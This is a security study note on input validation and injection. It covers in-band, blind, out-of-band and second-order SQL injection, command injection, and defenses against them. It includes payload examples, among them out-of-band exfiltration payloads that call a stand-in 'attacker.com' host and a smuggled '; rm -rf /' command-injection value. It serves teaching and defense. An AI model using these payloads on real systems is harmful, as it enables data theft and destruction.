# üìå 1.01 Input Validation & Injection

## üîç What is Input Validation?
Input validation is the process of ensuring user-provided input is clean, correct, and safe before it's processed by the application. Proper validation prevents malicious data from entering the system and triggering unintended behaviors.

---

## üö® Why It Matters
Failing to validate input properly can lead to:
- SQL Injection
- Command Injection
- Cross-Site Scripting (XSS)
- Path Traversal
- Local/Remote File Inclusion
- Buffer Overflow

---

## üß™ Types of Validation

| Type | Description |
|------|-------------|
| **Whitelist** | Only allow defined, expected values (most secure) |
| **Blacklist** | Disallow known bad values (bypassable) |
| **Length checks** | Enforce size constraints |
| **Format checks** | Validate pattern using regex (e.g., email, phone) |
| **Type checks** | Enforce input types (e.g., number, string, boolean) |
| **Encoding checks** | Ensure no untrusted control characters are accepted |

---

## üîê Security Best Practices

- Always validate on the **server side**
- Use built-in validation libraries
- Normalize input before validation (trim, decode)
- Don't rely on client-side validation for security
- Apply contextual output encoding (e.g., HTML, JS, SQL)

---

## üõ†Ô∏è SQL Injection

SQL Injection is a vulnerability that occurs when user input is improperly handled and injected directly into a SQL query. This can allow attackers to view, modify, or delete sensitive data, bypass authentication, or even execute system-level commands.

### In-Band SQLi (Error-Based, Union-Based)
The attacker uses the **same communication channel** to both launch the attack and gather the results.

- **Error-Based SQLi**: Relies on database error messages to extract data  
  _Example_: `' OR 1=1 ORDER BY 100--` (triggers error if column doesn't exist)

- **Union-Based SQLi**: Uses the `UNION` keyword to combine results of two queries  
  _Example_: `' UNION SELECT username, password FROM users--`

> üß† Note: In-Band SQLi is usually easy to detect because results are returned in the application response.

---

### Inferential SQLi (Boolean-Based, Time-Based)
The attacker **doesn't get direct output** but observes app behavior (true/false responses, delays) to infer backend data.

- **Boolean-Based Blind SQLi**  
  Alters query logic to observe differences in the application's response.  
  _Example_: `' AND 1=1 --` ‚Üí returns normal page  
  _Example_: `' AND 1=2 --` ‚Üí may trigger error or blank page

- **Time-Based Blind SQLi**  
  Injects delays to test conditions when visual feedback isn't available.  
  _Example_: `' OR IF(1=1, SLEEP(5), 0) --` (MySQL)  
  _Example_: `' OR pg_sleep(5) --` (PostgreSQL)

> üß† Note: Boolean-based SQLi relies on application response content. Time-based relies on response delay patterns.

> üí° Tools like SQLMap can automate boolean/time-based inference and database extraction.

---

### Out-of-Band SQLi
Used when the attacker cannot see output directly or observe timing. Leverages external services like DNS or HTTP callbacks.

- _Example_: `'; SELECT load_file('\\\\attacker.com\\leak') --`

> üîç **Out-of-Band SQLi Summary**  
> - **What is it?**: OOB SQLi is used when attackers cannot use the same channel to exfiltrate data (e.g., no error or timing feedback).  
> - **How it works**: The database sends data to an external server controlled by the attacker, often using DNS or HTTP requests.  
> - **Payload Examples**:
>   - **MSSQL**: `'; exec master..xp_dirtree '\\attacker.com\test' --`
>   - **Oracle**: `'; UTL_HTTP.REQUEST('http://attacker.com/leak') --`
>   - **MySQL**: `'; SELECT LOAD_FILE('\\\\attacker.com\\leak') --`
> - **When used**: Useful when UNION, error, and time-based SQLi aren't viable.  
> - **Defenses**:
>   - Disable dangerous functions like `LOAD_FILE`, `xp_cmdshell`, `UTL_HTTP`, etc.  
>   - Restrict outbound network access from the database server.  
>   - Use strict input validation and parameterized queries.

> üß† Note: This method requires features like `load_file`, `xp_dirtree`, or DNS lookups to be enabled in the DBMS.

### Second-Order SQLi

Second-order SQLi occurs when malicious input is stored by the application (e.g., in a database) and later used unsafely in a different SQL context.

**How It Works:**
- Attacker submits payload in a **non-executing context** (e.g., signup form, profile update).
- Later, the app **retrieves and uses** that stored data in a vulnerable SQL query **without sanitization**.
- The SQLi is triggered **indirectly**, making detection harder.

**Example Scenario:**
1. User signs up with a username:  
   `'admin' --`  
   (no attack triggered here)  
2. Later, the app runs:  
   ```sql
   SELECT * FROM users WHERE username = '$stored_username'
   ```
   ‚Üí SQLi triggers here when `$stored_username` is inserted unsanitized.

**Challenges:**
- Harder to detect during testing (no immediate feedback)
- Exploitation depends on internal workflows or re-use of data

**Defenses:**
- Sanitize and validate **both at input and output** stages
- Use **parameterized queries** always, even when reusing stored values
- Audit flows where stored data is later injected into queries

---

## üõ†Ô∏è Command Injection

Command Injection occurs when user input is passed directly to a system shell or OS command interpreter without proper sanitization, allowing arbitrary command execution.

### üîç How It Happens

Many backend scripts use commands like `ping`, `ls`, `cat`, etc., and naively embed user input into these commands.

```bash
# Vulnerable Bash example
ping $user_input
```

If `user_input = 8.8.8.8; rm -rf /`, the executed command becomes:
```bash
ping 8.8.8.8; rm -rf /
```

---

### üö® Real-World Examples

- `curl http://example.com?ip=8.8.8.8;whoami`
- Form fields that accept hostnames, filenames, or paths
- Misuse of `os.system()`, `Runtime.exec()`, or `ProcessBuilder` in code

---

### ‚öíÔ∏è Common Sinks

| Language | Vulnerable Function(s)             |
|----------|------------------------------------|
| Bash     | Direct CLI calls (`ping`, `cat`)   |
| Python   | `os.system`, `subprocess.call`     |
| PHP      | `exec()`, `shell_exec()`, `system()` |
| Java     | `Runtime.getRuntime().exec()`      |

## üõ°Ô∏è Unified Defenses for Injection Attacks

### üîê General Best Practices

- Treat **all input as untrusted**
- Enforce **strict validation** with allowlists
- Normalize and sanitize inputs (trim, decode, type check)
- Apply **context-aware output encoding** (e.g., HTML, SQL, JSON)

### üß± SQL Injection Defenses

- Always use **parameterized queries** or **ORMs** with bound parameters
- Avoid constructing raw SQL with user input
- Use **least privilege** for DB accounts
- Monitor for anomalies with **WAFs** or query logs

### üñ•Ô∏è Command Injection Defenses

- **Never concatenate input into shell/system calls**
- Use language-safe wrappers (e.g., `subprocess.run(..., shell=False)`)
- Sandbox command execution with `AppArmor`, `seccomp`, or containers
- Disable dangerous interpreters in production (e.g., Bash, Perl)
